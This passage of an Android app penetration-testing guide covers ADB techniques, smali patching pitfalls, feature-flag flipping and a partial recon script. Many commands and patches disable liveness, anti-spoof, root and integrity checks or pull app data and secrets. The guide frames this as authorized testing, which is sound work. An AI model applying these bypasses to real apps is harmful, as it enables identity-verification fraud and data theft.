| Exported components | Set `android:exported="false"`, require signature-level permissions |

### Legal / Authorization Boilerplate
Every report should include:
- Written authorization reference (pentest contract, bug bounty scope)
- Testing window (start/end dates)
- Devices used (emulator/physical, model, OS version)
- Statement: "Testing was performed within the agreed scope and with explicit authorization"
- Data handling: "No real user data was accessed or exfiltrated during testing"

---

## 36. Additional ADB & Device Techniques

### Wireless ADB (for NFC / Physical Testing)
```bash
# Android 11+ (pairing code method)
# On device: Developer Options > Wireless debugging > Pair with pairing code
adb pair <ip>:<pairing-port>    # enter the 6-digit code
adb connect <ip>:<connect-port>

# Older Android (requires initial USB connection)
adb tcpip 5555
adb connect <device-ip>:5555
# Disconnect USB cable
```

### Emulator Detection Fingerprints
| Property | Emulator Value |
|----------|---------------|
| `Build.FINGERPRINT` | Contains `generic`, `sdk_gphone`, `vbox` |
| `Build.MODEL` | `sdk_gphone64_arm64`, `Android SDK built for x86` |
| `Build.BRAND` | `generic`, `google` (emulator images) |
| `Build.HARDWARE` | `goldfish`, `ranchu` |
| `Build.PRODUCT` | `sdk_gphone64_arm64`, `vbox86p` |
| `ro.kernel.qemu` | `1` (QEMU-based) |
| `/dev/socket/qemud` | Exists on emulators |
| `/system/bin/qemu-props` | Exists on emulators |
| `getprop ro.hardware` | `goldfish`, `ranchu` |
| Sensors | Often missing or returning constant values |

```bash
# Quick emulator detection recon
grep -rn "goldfish\|ranchu\|sdk_gphone\|generic.*Build\|qemu" decoded/smali*/
grep -rn "Build\.FINGERPRINT\|Build\.MODEL\|Build\.BRAND\|Build\.HARDWARE\|Build\.PRODUCT" decoded/smali*/
```

### Multi-Architecture Native Library Patching
```bash
# List architectures
ls decoded/lib/
# arm64-v8a/  armeabi-v7a/  x86_64/  x86/

# Only patch the architecture matching your device
adb shell getprop ro.product.cpu.abi
# e.g., arm64-v8a

# For emulators: typically x86_64
# For physical devices: typically arm64-v8a

# If you delete other architectures, the app still works on matching devices
# (reduces patch surface area)
```

### Backup Extraction
```bash
# Check if backups are allowed
grep 'android:allowBackup' decoded/AndroidManifest.xml
# android:allowBackup="true" -> data extractable

# Extract app data via backup
adb backup -f backup.ab -noapk <package>

# Convert Android backup to tar
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
# Or use android-backup-extractor (abe.jar):
java -jar abe.jar unpack backup.ab backup.tar

# Extract and inspect
tar xf backup.tar
find apps/<package>/ -type f
# May contain: shared_prefs/, databases/, files/
```

### Process and Memory Inspection
```bash
# Check if app is running
adb shell pidof <package>

# Dump running app info
adb shell dumpsys activity processes | grep -A10 <package>

# Memory map (for finding loaded native libs)
adb shell cat /proc/<pid>/maps | grep -i "\.so"

# List open files
adb shell ls -la /proc/<pid>/fd/ 2>/dev/null | head -30
```

---

## 37. Watchouts & Pitfalls

### Kotlin Standard Library Dependency
Not every APK ships `kotlin-stdlib`. Pure Java apps, older apps, and some cross-platform frameworks (Flutter, React Native) have **zero Kotlin classes** in their DEX.

**How to check:**
```bash
# Look for Kotlin runtime in the APK
find decoded/smali*/ -path "*/kotlin/*" -name "*.smali" | head -5
grep -rn "Lkotlin/" decoded/smali*/ | head -5
```

**If no Kotlin runtime is present:**
- Do NOT inject smali code that references `Lkotlin/...` classes -- it will crash with `ClassNotFoundException`
- Do NOT use Kotlin-style patterns (companion objects, extension functions, coroutine types)
- Stick to pure Java/Android framework APIs in all injected code:
  - `Ljava/lang/String;` not `Lkotlin/text/StringsKt;`
  - `Ljava/util/ArrayList;` not `Lkotlin/collections/CollectionsKt;`
  - `Landroid/util/Log;` for logging (always safe)
  - `Ljava/io/File;` for file I/O (always safe)

**Quick rule:** If `decoded/smali*/kotlin/` directory doesn't exist, treat the app as pure Java.

### AndroidX vs. Support Library vs. Neither
Apps may use AndroidX, the old support library, or neither. Your injected code must match.

```bash
# Check which library the app uses
ls decoded/smali*/androidx/ 2>/dev/null && echo "Uses AndroidX"
ls decoded/smali*/android/support/ 2>/dev/null && echo "Uses Support Library"

# If neither exists, the app uses only android.* framework classes
```

| App Uses | Your hooks must reference |
|----------|-------------------------|
| AndroidX | `Landroidx/camera/core/ImageProxy;` etc. |
| Support Library | `Landroid/support/v4/...` etc. |
| Neither | Only `Landroid/...` framework classes |

**Mismatch = ClassNotFoundException at runtime.** Always verify before writing hooks.

### MinSdkVersion API Availability
APIs added in newer Android versions will crash on older devices with `NoSuchMethodError`.

```bash
# Check minSdkVersion
grep 'minSdkVersion' decoded/apktool.yml
```

| API | Minimum SDK | Safe Alternative |
|-----|-------------|-----------------|
| `Location.isMock()` | 31 (Android 12) | `Location.isFromMockProvider()` (API 18+) |
| `Bitmap.compress(WEBP_LOSSLESS)` | 30 | `Bitmap.compress(PNG)` (all versions) |
| `Files.readString()` | 26 (Java 11 on Android) | `BufferedReader` + `InputStreamReader` |
| `List.of()` | 30 | `Arrays.asList()` or `new ArrayList<>()` |

**Rule:** Match the app's `minSdkVersion`. If it targets API 21, your injected code must work on API 21.

### Multidex Class Placement
When injecting new classes, they must go in the right smali directory or the classloader won't find them.

```bash
# Find where the target package lives
find decoded/smali*/ -path "*/com/target/package" -type d

# If the target is in smali_classes3/, your new classes go there too
# The .class directive path must match the directory path:
# File: decoded/smali_classes3/com/target/package/MyHook.smali
# Directive: .class public Lcom/target/package/MyHook;
```

**Common mistake:** Putting the injected class in `smali/` when the target is in `smali_classes2/`. The class loads fine (ART merges all DEX), but if the injected class references other target classes, they must be resolvable from the same classloader namespace -- which they are across all `smali_classes*` dirs. **However**, some obfuscators isolate classloaders per DEX. When in doubt, place the new class in the **same** smali directory as the class that calls it.

### Register Clobbering
The most common cause of silent failures in smali patches. Your hook code overwrites a register that the original code needs later.

```smali
# DANGEROUS: original code uses v0 after this point
# Your hook overwrites v0 for logging:
const-string v0, "SmaliDebug"          # CLOBBERS v0!
const-string v1, "hook fired"          # CLOBBERS v1!
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

# SAFE: bump .locals and use fresh registers
# Change .locals 5 -> .locals 7, then use v5 and v6:
const-string v5, "SmaliDebug"
const-string v6, "hook fired"
invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

**Always:** Bump `.locals` by the number of new registers you need. Never reuse existing `v` registers unless you've verified they're dead at that point.

### Parameter Registers Are Aliased
`p` registers are aliases to the highest `v` registers. In a method with `.locals 3` and 2 parameters (instance method has `this` as p0):
```
v0, v1, v2 = locals
v3 = p0 (this)
v4 = p1 (first param)
v5 = p2 (second param)
```

**Pitfall:** If you bump `.locals 3` to `.locals 5`, the `p` registers shift:
```
v0, v1, v2, v3, v4 = locals  (now 5 locals)
v5 = p0 (this)                (was v3!)
v6 = p1 (first param)         (was v4!)
v7 = p2 (second param)        (was v5!)
```

All existing code still uses `p0`, `p1`, `p2` -- which auto-resolve to the new positions. So bumping `.locals` is **safe** for `p` register references. But if original code uses hard `v` register numbers that happen to be parameters (rare, but some decompilers emit this), bumping `.locals` breaks them.

**Check:** After bumping `.locals`, grep the method for `v` registers with numbers >= old `.locals` count. Those were parameter aliases and are now broken.

### apktool Version Mismatches
Different apktool versions decode/encode smali differently. A file decoded with apktool 2.7.0 may not rebuild with 2.9.3.

```bash
# Check your apktool version
apktool --version

# Always decode and rebuild with the SAME apktool version
# If you inherit a decoded directory from someone else, re-decode from the original APK
```

**Common symptoms:**
- `brut.androlib.AndrolibException` during build
- Resource table errors (especially `res/values/public.xml`)
- `9-patch image` errors
- Missing or extra resource type entries

**Fix:** `apktool d target.apk -o decoded/ -f` with YOUR version, then re-apply patches.

### Framework Files for System/Vendor Apps
Some APKs (especially pre-installed / system apps) reference framework resources not in the default `1.apk`.

```bash
# If apktool decode fails with "Could not decode resource..."
# Install the device's framework first:
adb pull /system/framework/framework-res.apk
apktool if framework-res.apk

# Some vendor overlays need additional frameworks:
adb pull /system/framework/framework-ext-res.apk
apktool if framework-ext-res.apk

# Then decode:
apktool d target.apk -o decoded/ -f
```

### ProGuard/R8 Traps
Obfuscated code has non-obvious gotchas:

- **Class merging:** R8 may merge classes together. A class you see in jadx may not exist as a separate `.smali` file.
- **Method inlining:** Small methods get inlined into callers. The method you want to hook may not exist -- its body lives inside another method.
- **Enum unboxing:** R8 replaces enum types with ints. The `LivenessResult.LIVE` enum you see in jadx may be just `const/4 v0, 0x0` in smali.
- **String encryption:** Some commercial obfuscators (DexGuard, iXGuard) encrypt string constants. You'll see calls like `a.b.c.d("encrypted_blob")` returning the real string at runtime.

```bash
# Detect string encryption (strings wrapped in method calls)
grep -rn "const-string.*==" decoded/smali*/   # base64-like strings
grep -rn 'invoke-static.*Ljava/lang/String;$' decoded/smali*/ | head -20
# Look for single-letter classes with String->String methods
```

### Signing Scheme Compatibility
The signing scheme must match what the device expects:

```bash
# Check original APK signing schemes
apksigner verify -v target.apk
# Shows: v1 scheme (JAR signing): true/false, v2 scheme: true/false, etc.

# Re-sign with matching schemes (at minimum v1+v2)
apksigner sign \
  --v1-signing-enabled true \
  --v2-signing-enabled true \
  --v3-signing-enabled false \
  --v4-signing-enabled false \
  --ks debug.keystore --ks-key-alias poc \
  --ks-pass pass:poctest123 aligned.apk
```

**Pitfall:** If the original app only had v2 signing and you sign with only v1, devices running Android 7+ may reject the APK silently.

### Storage Permission Scoped Storage (API 30+)
On Android 11+, `READ_EXTERNAL_STORAGE` no longer grants access to `/sdcard/` for arbitrary files.

```bash
# Check targetSdkVersion
grep 'targetSdkVersion' decoded/apktool.yml
```

| targetSdkVersion | /sdcard/ access for hook payloads |
|------------------|---------------------------------|
| < 29 | `READ_EXTERNAL_STORAGE` works normally |
| 29 | `requestLegacyExternalStorage=true` in manifest + permission |
| 30+ | Must use `MANAGE_EXTERNAL_STORAGE` + appops grant |

```bash
# For API 30+ targets, BOTH are required:
# 1. Add to manifest:
#    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
# 2. Grant via adb:
adb shell appops set <package> MANAGE_EXTERNAL_STORAGE allow
```

**If your injected interceptor reads from `/sdcard/poc_frames/` and the app targets API 30+, it WILL get `FileNotFoundException` without the appops grant.**

### Thread Safety in Hooks
Camera frame callbacks, sensor events, and location updates arrive on **background threads**. Your injected hook code must be thread-safe.

**Safe:**
- Reading a config file (atomic read)
- Logging with `Log.d()` (thread-safe)
- Returning a pre-loaded constant (immutable)

**Unsafe:**
- Lazy-initializing a shared mutable field without synchronization
- Incrementing a frame counter without `AtomicInteger`
- Writing to a shared `ArrayList` from multiple callbacks

**Practical advice:** Keep hooks stateless where possible. Load config once at init, return values from pre-computed state. If you must track state (frame index counter), use `Ljava/util/concurrent/atomic/AtomicInteger;`.

### Test on the Target Device, Not Just Emulator
Emulators differ from real devices in ways that affect hooks:

| Difference | Impact |
|-----------|--------|
| Camera | Emulator uses virtual camera; real device has hardware ISP pipeline |
| Sensors | Emulator sensors return synthetic data; real device has noise |
| Performance | Emulator may be slower, causing timing-sensitive checks to behave differently |
| NFC | Not available on most emulators |
| Biometric hardware | Emulator simulates fingerprint; no real face/iris hardware |
| Native libraries | Emulator runs x86_64; real device runs arm64. `.so` patches must match |

**Rule:** Final validation always runs on a physical device matching the target's architecture.

### Don't Trust jadx Line Numbers
jadx decompiles DEX back to approximate Java. The line numbers, variable names, and even control flow may not match the original source or the smali.

- Use jadx to **understand logic**, not to find exact locations
- Use smali to **find exact hook points** (`.line` directives, register state)
- Cross-reference: find the method in jadx, understand it, then open the same method in the `.smali` file to plan the patch

### Beware of Multiple Code Paths
Modern apps often have:
- **A/B testing branches** -- the code path you see in testing may differ from production
- **Feature flags** -- Firebase Remote Config or server-controlled toggles
- **Fallback implementations** -- if primary SDK fails, a secondary check runs
- **Retry logic** -- your hook fires on the first attempt, but the app retries with a different code path

**Always check:** After patching one path, does the app have a fallback? grep for alternative implementations:
```bash
# Look for multiple implementations of the same interface
grep -rn "implements Lcom/target/LivenessChecker;" decoded/smali*/
# If there are 2+ classes, you need to patch ALL of them

# Look for fallback keywords
grep -rn "fallback\|retry\|alternative\|backup\|secondary" decoded/smali*/
```

---

## 38. Feature Flag Exploitation

Feature flags control which code paths are active -- security checks, liveness modes, SDK versions, debug endpoints. Flipping the right flag can disable an entire defense without touching a single line of smali.

### Where Feature Flags Live

| Source | Location | Persistence | Offline? |
|--------|----------|-------------|----------|
| Firebase Remote Config defaults | `res/xml/remote_config_defaults.xml` | Until first server fetch | Yes (defaults used offline) |
| Firebase Remote Config cache | `shared_prefs/com.google.firebase.remoteconfig*` on device | Until next fetch (~12h) | Yes (cached values) |
| JSON config in assets | `assets/config.json`, `assets/sdk_config.json`, etc. | Permanent (bundled in APK) | Yes |
| SharedPreferences defaults | `res/xml/*_preferences.xml` | Until app clears prefs | Yes |
| SharedPreferences at runtime | `shared_prefs/*.xml` on device | Until app clears prefs | Yes |
| BuildConfig fields | Compiled into `BuildConfig.smali` | Permanent (compiled) | Yes |
| Server-fetched flags | In memory after API call | Until next fetch | No (needs network) |
| Hardcoded constants | `const` in smali / `static final` in Java | Permanent | Yes |

### Recon: Finding All Feature Flags

```bash
# 1. Firebase Remote Config defaults (highest-value target)
cat decoded/res/xml/remote_config_defaults.xml 2>/dev/null

# 2. JSON configs in assets
find decoded/assets/ decoded/res/raw/ -name "*.json" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# 3. BuildConfig fields (debug flags, environment toggles)
find decoded/smali*/ -name "BuildConfig.smali" -exec echo "=== {} ===" \; -exec grep "const\|sget" {} \;

# 4. SharedPreferences default values in XML
find decoded/res/xml/ -name "*prefer*" -o -name "*settings*" -o -name "*config*" 2>/dev/null

# 5. Hardcoded boolean flags in app code
grep -rn "const-string.*debug\|const-string.*enable\|const-string.*disable\|const-string.*bypass\|const-string.*skip\|const-string.*force" decoded/smali*/com/ | head -30

# 6. String resources with flag-like names
grep -iE "enable|disable|debug|bypass|skip|force|mock|test|staging|feature" decoded/res/values/strings.xml | head -20

# 7. Flag consumption points (where the app reads flags)
grep -rn "getBoolean\|getString\|getLong\|getDouble" decoded/smali*/ | grep -iE "remote_config\|RemoteConfig\|firebase" | head -20
grep -rn "SharedPreferences.*getBoolean\|SharedPreferences.*getString" decoded/smali*/ | head -20
```

### Firebase Remote Config Exploitation

Firebase Remote Config ships default values in `res/xml/remote_config_defaults.xml`. These are used:
- Before the first server fetch
- When the device is offline
- When the fetch fails

```xml
<!-- BEFORE: original defaults -->
<defaultsMap>
    <entry><key>liveness_enabled</key><value>true</value></entry>
    <entry><key>anti_spoof_enabled</key><value>true</value></entry>
    <entry><key>min_liveness_score</key><value>0.85</value></entry>
    <entry><key>force_camera_check</key><value>true</value></entry>
    <entry><key>debug_mode</key><value>false</value></entry>
    <entry><key>environment</key><value>production</value></entry>
</defaultsMap>

<!-- AFTER: patched defaults -->
<defaultsMap>
    <entry><key>liveness_enabled</key><value>false</value></entry>
    <entry><key>anti_spoof_enabled</key><value>false</value></entry>
    <entry><key>min_liveness_score</key><value>0.01</value></entry>
    <entry><key>force_camera_check</key><value>false</value></entry>
    <entry><key>debug_mode</key><value>true</value></entry>
    <entry><key>environment</key><value>staging</value></entry>
</defaultsMap>
```

**Preventing server override:** The app fetches real values from Firebase on launch. To keep your defaults active:

```bash
# Option A: Block Firebase fetch (nop the fetch call)
grep -rn "fetch\|fetchAndActivate\|FirebaseRemoteConfig" decoded/smali*/
# Find: invoke-virtual {v0}, Lcom/google/firebase/remoteconfig/FirebaseRemoteConfig;->fetchAndActivate()...
# Replace with: nop

# Option B: Block network for Firebase only (patch network_security_config)
# This breaks ALL Firebase calls, which may also disable analytics/crashlytics

# Option C: Patch the consumption point to always use defaults
# Find: invoke-virtual {v0, v1}, ...FirebaseRemoteConfig;->getBoolean(Ljava/lang/String;)Z
# Replace with: const/4 v0, 0x0  (or 0x1, depending on what you need)
```

### BuildConfig Flag Flipping

```bash
# Find BuildConfig
find decoded/smali*/ -name "BuildConfig.smali"

# Typical contents:
# .field public static final DEBUG:Z = false
# .field public static final BUILD_TYPE:Ljava/lang/String; = "release"
# .field public static final FLAVOR:Ljava/lang/String; = "production"
```

```smali
# Flip DEBUG to true
# BEFORE:
.field public static final DEBUG:Z = false

# AFTER:
.field public static final DEBUG:Z = true
```

```smali
# Change FLAVOR from production to staging
# BEFORE:
.field public static final FLAVOR:Ljava/lang/String; = "production"

# AFTER:
.field public static final FLAVOR:Ljava/lang/String; = "staging"
```

**What DEBUG=true often unlocks:**
- Verbose logging (reveals internal state, tokens, API responses)
- Relaxed SSL/TLS checks
- Shorter timeouts
- Mock data paths
- Hidden debug menus
- Bypassed analytics/tracking

### SharedPreferences Manipulation

**Pre-install (modify defaults in APK):**
```bash
# Find preference XMLs
find decoded/res/xml/ -name "*.xml" -exec grep -l "defaultValue\|android:default" {} \;

# Edit defaults
# Change android:defaultValue="true" to "false" for security checks
```

**Post-install (modify on device):**
```bash
# Find SharedPreferences files
adb shell run-as <package> ls shared_prefs/ 2>/dev/null
# If run-as fails (not debuggable), use:
adb shell su -c "ls /data/data/<package>/shared_prefs/"

# Pull, edit, push back
adb shell run-as <package> cat shared_prefs/<file>.xml > prefs.xml
# Edit prefs.xml locally
adb shell run-as <package> cp /dev/stdin shared_prefs/<file>.xml < prefs.xml

# Or on rooted/emulator:
adb shell su -c "cat /data/data/<package>/shared_prefs/<file>.xml"
# Edit and push back
```

**Common SharedPreferences flags to flip:**
```xml
<!-- Security flags -->
<boolean name="is_rooted" value="false" />
<boolean name="integrity_verified" value="true" />
<boolean name="biometric_enrolled" value="true" />

<!-- Debug/testing flags -->
<boolean name="debug_enabled" value="true" />
<string name="api_environment">staging</string>
<boolean name="skip_onboarding" value="true" />

<!-- Feature flags cached from server -->
<boolean name="feature_liveness_v2" value="false" />
<boolean name="feature_nfc_required" value="false" />
<int name="max_retries" value="999" />
```

### Hardcoded Constants in Smali

Some flags are compiled as `const` values, not read from config:

```bash
# Find boolean constants that control behavior
grep -rn "const/4 v.*0x[01]" decoded/smali*/com/target/ | head -30

# Better: find named constants via field access
grep -rn "sget-boolean\|sget-object.*Config\|sget-object.*Feature\|sget-object.*Flag" decoded/smali*/com/target/ | head -20

# Find enum-based feature gates
grep -rn "Feature\|FeatureFlag\|Toggle\|Experiment" decoded/smali*/com/target/ | head -20
```

```smali
# Patch a hardcoded check
# BEFORE:
sget-boolean v0, Lcom/target/Config;->LIVENESS_REQUIRED:Z
if-eqz v0, :skip_liveness

# AFTER (nop the check, always skip):
nop
nop
goto :skip_liveness
```

### Server-Fetched Flags: Interception Strategies

When flags come from the server at runtime, you can't edit a file. Instead:

```bash
# 1. Find where the flag response is parsed
grep -rn "feature_flag\|featureFlag\|isEnabled\|isFeatureEnabled" decoded/smali*/

# 2. Find the specific flag consumption
grep -rn "invoke.*getBoolean\|invoke.*isEnabled\|invoke.*getFlag" decoded/smali*/com/target/ | head -20
```

**Strategy A: Patch the reader method**
```smali
# Find: public boolean isFeatureEnabled(String featureName)
# Replace entire method body:
.method public isFeatureEnabled(Ljava/lang/String;)Z
    .locals 1
    const/4 v0, 0x1    # all features enabled
    return v0
.end method
```

**Strategy B: Patch at the call site**
```smali
# BEFORE:
const-string v1, "require_liveness"
invoke-virtual {v0, v1}, Lcom/target/FeatureManager;->isFeatureEnabled(Ljava/lang/String;)Z
move-result v2
if-nez v2, :do_liveness

# AFTER: force the flag to false
const-string v1, "require_liveness"
invoke-virtual {v0, v1}, Lcom/target/FeatureManager;->isFeatureEnabled(Ljava/lang/String;)Z
move-result v2
const/4 v2, 0x0       # override: feature disabled
if-nez v2, :do_liveness
```

**Strategy C: Intercept the network response** (requires proxy)
Modify the JSON response from the feature flag endpoint to flip values before the app processes them.

### Environment Switching

Many apps have hidden environment toggles (production, staging, sandbox). Staging/sandbox environments often have:
- Relaxed security checks
- Test accounts that bypass verification
- Verbose logging
- Mock data sources

```bash
# Find environment references
grep -rn "staging\|sandbox\|development\|dev_mode\|base_url\|api_url\|environment" decoded/smali*/ | grep -v "\.line" | head -20
grep -rn "staging\|sandbox\|development" decoded/assets/ decoded/res/ 2>/dev/null

# Find URL switching logic
grep -rn "https://.*api\.\|https://.*staging\.\|https://.*sandbox\." decoded/smali*/ | head -10
```

```smali
# Patch API base URL from production to staging
# BEFORE:
const-string v0, "https://api.target.com/v2/"

# AFTER:
const-string v0, "https://api-staging.target.com/v2/"
```

**Watchout:** Staging environments may accept your patched APK's debug signature while production servers reject it. This can be a useful shortcut -- the bypass works because you're talking to a less-defended backend.

### Flag Exploitation Decision Tree

```text
Can you find the flag value in a file inside the APK?
  YES -> Is it remote_config_defaults.xml?
           YES -> Edit XML + nop fetchAndActivate() to prevent server override
           NO  -> Is it assets/*.json?
                    YES -> Edit JSON directly
                    NO  -> Is it BuildConfig.smali?
                             YES -> Flip the const field
                             NO  -> Edit the file (properties, XML, etc.)
  NO  -> Is the flag in SharedPreferences?
           YES -> Can you run-as or have root?
                    YES -> Edit shared_prefs XML on device
                    NO  -> Patch the SharedPreferences.getBoolean() call site in smali
           NO  -> Flag comes from server at runtime
                    -> Patch the reader method (Strategy A)
                    -> Or patch the call site (Strategy B)
                    -> Or intercept via proxy (Strategy C)
```

---

## 39. Full Recon Script (One-Pass Attack Surface Report)

Run this after `apktool d target.apk -o decoded/`. It produces a complete attack surface map in one pass.

```bash
#!/usr/bin/env bash
set -euo pipefail

DECODED="${1:?Usage: $0 <decoded-dir>}"
[ -d "$DECODED" ] || { echo "ERROR: $DECODED not found"; exit 1; }

MANIFEST="$DECODED/AndroidManifest.xml"
SMALI="$DECODED/smali*"
OUT="recon-report-$(date +%Y%m%d-%H%M%S).txt"

divider() { echo -e "\n========== $1 =========="; }

{

divider "1. APP IDENTITY"
echo "--- Package ---"
grep 'package=' "$MANIFEST" | head -1
echo "--- Version ---"
grep 'versionName\|versionCode' "$DECODED/apktool.yml" 2>/dev/null || echo "(not found in apktool.yml)"
echo "--- SDK Levels ---"
grep 'minSdkVersion\|targetSdkVersion' "$DECODED/apktool.yml" 2>/dev/null || echo "(not found)"
echo "--- Application Class ---"
grep -oP 'android:name="[^"]*"' "$MANIFEST" | head -1 || echo "(default Application)"

divider "2. PERMISSIONS"
grep 'uses-permission' "$MANIFEST" | sed 's/.*name="//;s/".*//' | sort

divider "3. EXPORTED COMPONENTS"
echo "--- Activities ---"
grep -B2 'exported="true"' "$MANIFEST" | grep 'activity\|android:name' || echo "(none)"
echo "--- Services ---"
grep -B2 -A1 '<service' "$MANIFEST" | grep 'exported="true"\|android:name' || echo "(none)"
echo "--- Receivers ---"
grep -B2 -A1 '<receiver' "$MANIFEST" | grep 'exported="true"\|android:name' || echo "(none)"
echo "--- Providers ---"
grep -B2 -A3 '<provider' "$MANIFEST" | grep 'exported="true"\|android:name\|authorities' || echo "(none)"

divider "4. DEEP LINKS"
grep -A5 'android:scheme=' "$MANIFEST" 2>/dev/null || echo "(none)"

divider "5. CAMERA API"
echo "--- CameraX ---"
grep -rln "ImageAnalysis\|ImageProxy\|CameraX" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- Camera2 ---"
grep -rln "CameraDevice\|CameraCaptureSession\|ImageReader" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- Analyzer Implementations ---"
grep -rn "implements.*ImageAnalysis\$Analyzer" $SMALI 2>/dev/null || echo "(none)"

divider "6. LOCATION API"
echo "--- FusedLocation ---"
grep -rln "FusedLocation\|onLocationResult\|getLastLocation" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- LocationManager ---"
grep -rln "onLocationChanged\|getLastKnownLocation" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- Mock Detection ---"
grep -rn "isFromMockProvider\|isMock\|mock_location" $SMALI 2>/dev/null | head -10 || echo "(none)"
echo "--- Geofence Constants ---"
grep -rn "geofence\|LatLng\|latitude\|longitude" $SMALI 2>/dev/null | grep -i "const\|string" | head -10 || echo "(none)"

divider "7. SENSOR API"
grep -rln "onSensorChanged\|SensorEventListener\|TYPE_ACCELEROMETER\|TYPE_GYROSCOPE" $SMALI 2>/dev/null | head -10 || echo "(not found)"

divider "8. BIOMETRIC / LIVENESS"
echo "--- BiometricPrompt ---"
grep -rln "BiometricPrompt\|FingerprintManager" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- Liveness SDKs ---"
grep -rln "facetec\|iproov\|jumio\|onfido\|regula\|daon\|aware\|liveness" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- Liveness Result Mapping ---"
grep -rn "LIVE\|SPOOF\|INDET\|LivenessResult\|livenessVerdict" $SMALI 2>/dev/null | head -10 || echo "(none)"

divider "9. ANTI-TAMPER DEFENSES"
echo "--- Signature Verification ---"
grep -rln "getPackageInfo\|GET_SIGNATURES\|GET_SIGNING_CERTIFICATES\|MessageDigest" $SMALI 2>/dev/null | sort -u | head -10 || echo "(none)"
echo "--- DEX Integrity ---"
grep -rln "classes\.dex\|getCrc\|getChecksum\|ZipEntry" $SMALI 2>/dev/null | sort -u | head -10 || echo "(none)"
echo "--- Installer Verification ---"
grep -rln "getInstallingPackageName\|getInstallSourceInfo\|com\.android\.vending" $SMALI 2>/dev/null | sort -u | head -5 || echo "(none)"
echo "--- Root/Emulator Detection ---"
grep -rln "su\b\|/system/xbin\|Superuser\|magisk\|goldfish\|sdk_gphone\|ranchu" $SMALI 2>/dev/null | sort -u | head -10 || echo "(none)"
echo "--- Play Integrity / SafetyNet ---"
grep -rln "IntegrityToken\|SafetyNet\|safetynet\|PlayIntegrity" $SMALI 2>/dev/null | sort -u | head -5 || echo "(none)"
echo "--- Certificate Pinning ---"
grep -rn "CertificatePinner" $SMALI 2>/dev/null | head -5 || echo "(none)"
grep 'network_security_config' "$MANIFEST" 2>/dev/null || echo "(no network security config)"
echo "--- Debug Detection ---"
grep -rln "android:debuggable\|isDebuggerConnected\|Debug\.isDebuggerConnected" $SMALI 2>/dev/null | head -5 || echo "(none)"
echo "--- Frida/Xposed Detection ---"
grep -rln "frida\|xposed\|substrate\|cydia" $SMALI 2>/dev/null | head -5 || echo "(none)"

divider "10. NATIVE CODE (JNI)"
echo "--- Native Method Declarations ---"
grep -rn "\.method.*native" $SMALI 2>/dev/null | head -10 || echo "(none)"
echo "--- System.loadLibrary ---"
grep -rn "loadLibrary\|System\.load" $SMALI 2>/dev/null | head -10 || echo "(none)"
echo "--- Native Libraries ---"
ls "$DECODED/lib/"*/ 2>/dev/null || echo "(no native libs)"

divider "11. WEBVIEW"
echo "--- WebView Usage ---"
grep -rln "WebView\|WebViewClient\|loadUrl\|loadData" $SMALI 2>/dev/null | head -10 || echo "(not found)"
echo "--- JavaScript Interfaces ---"
grep -rn "addJavascriptInterface\|JavascriptInterface" $SMALI 2>/dev/null | head -10 || echo "(none)"

divider "12. ASSETS & CONFIGS"
echo "--- JSON Configs ---"
find "$DECODED/assets/" "$DECODED/res/raw/" -name "*.json" 2>/dev/null || echo "(none)"
echo "--- ML Models ---"
find "$DECODED/assets/" "$DECODED/res/raw/" -name "*.tflite" -o -name "*.onnx" -o -name "*.pt" -o -name "*.mlmodel" 2>/dev/null || echo "(none)"
echo "--- Firebase Remote Config ---"
[ -f "$DECODED/res/xml/remote_config_defaults.xml" ] && echo "FOUND: res/xml/remote_config_defaults.xml" || echo "(none)"
echo "--- Properties/Config Files ---"
find "$DECODED/assets/" "$DECODED/res/raw/" -name "*.properties" -o -name "*.cfg" -o -name "*.conf" -o -name "*.yaml" 2>/dev/null || echo "(none)"

divider "13. FEATURE FLAGS"
echo "--- BuildConfig ---"
find "$DECODED"/smali*/ -name "BuildConfig.smali" -exec echo "=== {} ===" \; -exec grep "const\|\.field.*static.*final" {} \; 2>/dev/null || echo "(not found)"
echo "--- SharedPreferences Defaults ---"
find "$DECODED/res/xml/" -name "*prefer*" -o -name "*settings*" -o -name "*config*" 2>/dev/null || echo "(none)"
echo "--- Flag-like Strings ---"
grep -iE "enable|disable|debug|bypass|skip|force|mock|staging|feature_flag" "$DECODED/res/values/strings.xml" 2>/dev/null | head -15 || echo "(none)"

divider "14. ENCRYPTION & SECRETS"
echo "--- Hardcoded Keys/Tokens ---"
grep -rn "api_key\|apiKey\|secret\|API_KEY\|SECRET\|Bearer\|token" "$DECODED/res/values/strings.xml" 2>/dev/null | head -10 || echo "(none)"
echo "--- Cipher Usage ---"
grep -rln "Cipher\|SecretKey\|AES\|RSA\|EncryptedSharedPreferences" $SMALI 2>/dev/null | sort -u | head -10 || echo "(none)"

divider "15. KOTLIN / FRAMEWORK PROFILE"
echo "--- Kotlin Runtime ---"
KOTLIN_COUNT=$(find "$DECODED"/smali*/ -path "*/kotlin/*" -name "*.smali" 2>/dev/null | wc -l | tr -d ' ')
[ "$KOTLIN_COUNT" -gt 0 ] && echo "PRESENT ($KOTLIN_COUNT files)" || echo "NOT PRESENT -- pure Java app, do NOT reference Lkotlin/ in patches"
echo "--- AndroidX ---"
[ -d "$DECODED/smali"/*/androidx ] || [ -d "$DECODED/smali_classes"*/androidx ] 2>/dev/null && echo "PRESENT" || echo "NOT PRESENT"
echo "--- Support Library ---"
find "$DECODED"/smali*/ -path "*/android/support/*" -name "*.smali" 2>/dev/null | head -1 | grep -q . && echo "PRESENT" || echo "NOT PRESENT"

divider "16. MULTI-DEX LAYOUT"
for d in "$DECODED"/smali*/; do
    COUNT=$(find "$d" -name "*.smali" 2>/dev/null | wc -l | tr -d ' ')
    echo "$(basename "$d"): $COUNT classes"
done

divider "17. THIRD-PARTY SDKs"
for sdk_dir in "$DECODED"/smali*/com/ "$DECODED"/smali*/io/ "$DECODED"/smali*/org/; do
    [ -d "$sdk_dir" ] && ls -1 "$sdk_dir" 2>/dev/null
